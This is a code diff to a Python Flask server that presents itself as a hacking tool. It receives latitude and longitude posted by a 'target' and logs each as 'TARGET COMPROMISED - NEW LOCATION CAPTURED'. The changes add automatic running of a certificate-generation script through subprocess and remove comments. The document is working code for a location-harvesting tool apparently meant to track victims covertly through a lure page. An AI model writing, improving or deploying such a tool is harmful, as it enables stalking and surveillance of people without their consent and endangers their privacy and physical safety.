@@ -1,5 +1,7 @@
+
 import os
 import sys
+import subprocess
 from flask import Flask, render_template, request, jsonify
 
 # Correctly initialize the Flask application using __name__
@@ -15,10 +17,7 @@ RESET = '\033[0m'
 
 # Function to clear the screen and display the hacking banner
 def show_banner():
-    # Clears the terminal screen (handles Linux/Termux 'clear' and Windows 'cls')
     os.system('clear' if os.name != 'nt' else 'cls')
-    
-    # Prefixed with r to treat the ASCII artwork as a raw string and prevent escape sequence warnings
     banner = r"""""" + f"""{GREEN}{BOLD}
 ======================================================================
   _______ _____          _____ _  ____  __ ______ _   _  ______          __
@@ -42,13 +41,12 @@ def update_location():
     try:
         data = request.get_json()
         if not data:
-            print(f"{RED}[-) Warning: Empty payload received from target.{RESET}")
+            print(f"{RED}[-] Warning: Empty payload received from target.{RESET}")
             return jsonify({"status": "error", "message": "No data received"}), 400
         
         latitude = data.get('lat')
         longitude = data.get('lon')
         
-        # Professional cyber security styled live logging
         print(f"\n{GREEN}{BOLD}[🎯] TARGET COMPROMISED - NEW LOCATION CAPTURED!{RESET}")
         print(f"    {CYAN}LATITUDE  :{RESET} {YELLOW}{latitude}{RESET}")
         print(f"    {CYAN}LONGITUDE :{RESET} {YELLOW}{longitude}{RESET}")
@@ -61,18 +59,22 @@ def update_location():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == '__main__':
-    # 1. Clear terminal history and print the primary banner at the top
     show_banner()
     
     cert_path = 'cert.pem'
     key_path = 'key.pem'
     
-    # 2. Print initial environment checks right underneath the banner
+    # Self-healing block: If certs are missing, attempt auto-generation via script
+    if not (os.path.exists(cert_path) and os.path.exists(key_path)):
+        print(f"{YELLOW}[!] Notice: Missing SSL credentials. Executing auto-compilation...{RESET}")
+        if os.path.exists('generate_cert.sh'):
+            subprocess.run(['bash', 'generate_cert.sh'])
+        
     if os.path.exists(cert_path) and os.path.exists(key_path):
         print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
         print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}\n")
         
-        # Suppress Flask's default development server warning text to keep terminal layout clean
+        # Suppress Flask default developer banners
         cli = sys.modules['flask.cli']
         cli.show_server_banner = lambda *x: None 
         
@@ -83,6 +85,4 @@ if __name__ == '__main__':
             ssl_context=(cert_path, key_path)
         )
     else:
-        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL certificates Missing!{RESET}")
-        print(f"{YELLOW}[!] Deployment Hint: Run './generate_cert.sh' to compile credentials before launching.{RESET}")
-        
+        print(f"{RED}{BOLD}[-] CRITICAL FAILURE: SSL layer negotiation aborted. Files deployment failed.{RESET}")
